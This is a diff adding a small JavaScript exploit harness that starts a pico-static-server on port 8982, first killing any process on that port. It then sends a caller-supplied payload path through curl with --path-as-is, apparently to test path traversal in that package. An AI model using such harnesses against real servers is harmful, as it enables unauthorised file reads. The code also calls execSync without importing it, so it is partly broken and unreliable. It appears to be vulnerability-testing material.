@@ -1,0 +1,25 @@
+function exploitFunction(payload) {
+    const path = require("path");
+    const createServer = require("pico-static-server");
+    const fs = require("fs");
+    const { exec } = require("child_process");
+
+    try {
+        execSync("fuser -k 8982/tcp", () => {});
+    } catch (e) {}
+
+    const staticServer = createServer({
+        defaultFile: "index.html",
+        staticPath: ".",
+        port: 8982,
+    });
+
+    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8982${payload}"`;
+    exec(attack_string, (error, stdout) => {
+        if (stdout) {
+            console.log(stdout);
+        }
+    });
+}
+
+module.exports = { exploitFunction };
